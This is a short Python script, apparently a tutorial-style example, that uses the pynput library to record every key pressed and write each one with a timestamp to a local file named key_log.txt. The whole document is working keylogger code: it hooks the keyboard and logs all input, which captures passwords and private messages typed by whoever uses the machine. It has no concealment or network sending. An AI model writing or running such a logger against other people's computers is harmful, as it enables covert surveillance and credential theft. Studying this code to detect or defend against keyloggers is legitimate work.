from pynput.keyboard import Key, Listener
import logging

log_dir = "" #choose current directory

#creating new file and setting format of everyline to be printed
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key)) #add logging information before key value

with Listener(on_press=on_press) as listener: #collect keys on pressed in keyboard
    listener.join()
